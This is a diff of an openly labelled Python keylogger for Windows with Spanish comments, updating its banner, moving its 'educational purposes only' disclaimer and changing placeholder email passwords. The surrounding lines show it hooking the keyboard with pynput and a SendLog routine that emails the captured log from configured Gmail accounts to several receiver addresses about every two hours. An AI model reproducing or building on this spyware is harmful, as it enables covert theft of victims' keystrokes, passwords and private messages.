@@ -1,14 +1,15 @@
-#################################################################
-#                                                               #
-#                 Developed by SebastianEPH                     #
-#                                                   v.2.1       #
-#################################################################
-
-# Notas importantes
-#
-# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script, por el detalle***
-#
-# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python
+#██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
+#██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
+#█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
+#██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
+#██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
+#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
+#░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗
+#░██║░░██╗░░██║██║████╗░██║██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝
+#░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
+#░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
+#░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
+#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.0
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -132,11 +133,11 @@ def SendLog():
 
         # Correo de envío [Principal]      <=> Se enviará 
         sender_email_P       = "Send123@gmail.com"   # <<== Cambia éste correo
-        sender_password_P    = "contraseña"          # <<== Contraseña del correo 
+        sender_password_P    = "contraseña1"          # <<== Contraseña del correo 
 
         # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
         sender_email_S       = "Sendabc@gmail.com"   # <<== Cambia éste correo
-        sender_password_S    = "contraseña"          # <<== Contraseña del correo 
+        sender_password_S    = "contraseña2"          # <<== Contraseña del correo 
 
         # Correo o correos que recibirán el registro de datos `log.txt`
         receiver_email   = ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"] # MultiCorreo
@@ -144,7 +145,7 @@ def SendLog():
 
         # Enviar cada 2 horas aprox
         for x in range(720):    #720
-            time.sleep(10)
+            time.sleep(10) # *10 
             #print("Pasó: "+ str(x*10))
 
         if VerificarConexion(): # Continua solo si hay conexión
@@ -177,3 +178,15 @@ if __name__ == '__main__':
     p2.start()
     p1.start()
     p1.join()
+
+#################################################################
+#                                                               #
+#                 Developed by SebastianEPH                     #
+#                                                   v.2.1       #
+#################################################################
+# Notas importantes
+#
+# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
+#
+# Lea la documentación en: https://github.com/SebastianEPH/Keylogger_Python
+
